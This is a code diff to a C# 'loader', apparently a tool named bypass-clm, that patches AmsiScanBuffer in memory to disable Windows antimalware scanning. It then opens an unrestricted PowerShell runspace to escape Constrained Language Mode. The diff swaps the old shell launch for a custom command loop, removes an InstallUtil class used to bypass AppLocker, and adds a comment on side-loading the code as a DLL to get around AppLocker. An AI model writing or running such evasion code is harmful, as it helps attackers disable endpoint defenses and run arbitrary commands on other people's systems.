@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Runtime.InteropServices;
 using System.Runtime.CompilerServices;
 
@@ -64,25 +65,52 @@ namespace loader
                 Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }, 0, AmsiScanBuffer, 8);
             }
 
-            // Run powershell from the current process (won't start powershell.exe, but run from the powershell .Net libraries)
-            Microsoft.PowerShell.ConsoleShell.Start(System.Management.Automation.Runspaces.RunspaceConfiguration.Create(), "Banner", "Help", new string[] {
-                "-exec", "bypass", "-nop"
-            });
+            var asmDir = Path.GetDirectoryName(typeof(System.Management.Automation.PowerShell).Assembly.Location);
+            if (asmDir != null)
+            {
+                var modulesDir = Path.Combine(asmDir, "Modules");
+                if (!Directory.Exists(modulesDir))
+                    modulesDir = Path.Combine(asmDir, "runtimes", "win", "lib", "net10.0", "Modules");
+                if (Directory.Exists(modulesDir))
+                    Environment.SetEnvironmentVariable("PSModulePath",
+                        modulesDir + ";" + Environment.GetEnvironmentVariable("PSModulePath"));
+            }
+
+            var iss = System.Management.Automation.Runspaces.InitialSessionState.CreateDefault2();
+            using var runspace = System.Management.Automation.Runspaces.RunspaceFactory.CreateRunspace(iss);
+            runspace.Open();
+            using var shell = System.Management.Automation.PowerShell.Create();
+            shell.Runspace = runspace;
+            while (true)
+            {
+                Console.Write("PS> ");
+                var line = Console.ReadLine();
+                if (line == null || line.Equals("exit", StringComparison.OrdinalIgnoreCase))
+                    break;
+                try
+                {
+                    shell.AddScript(line);
+                    var results = shell.Invoke();
+                    foreach (var r in results)
+                        Console.WriteLine(r);
+                    if (shell.Streams.Error.Count > 0)
+                    {
+                        foreach (var e in shell.Streams.Error)
+                            Console.Error.WriteLine(e);
+                        shell.Streams.Error.Clear();
+                    }
+                    shell.Commands.Clear();
+                }
+                catch (Exception ex)
+                {
+                    Console.Error.WriteLine(ex.Message);
+                    shell.Commands.Clear();
+                }
+            }
         }
     }
 
-    // This class is used if you need to load this with InstallUtil to bypass AppLocker.
-    // usage: InstallUtil.exe /logfile= /LogToConsole=false /U "C:\Windows\Tasks\bypass-clm.exe"
-    [System.ComponentModel.RunInstaller(true)]
-    public class Loader : System.Configuration.Install.Installer
-    {
-
-        public override void Uninstall(System.Collections.IDictionary savedState)
-        {
-            base.Uninstall(savedState);
-
-            MainClass.go();
-        }
-    }
+    // InstallUtil doesn't exist on modern .NET. To side-load via AppLocker bypass,
+    // build as a DLL and invoke MainClass.go() from an allowed caller instead.
 
 }
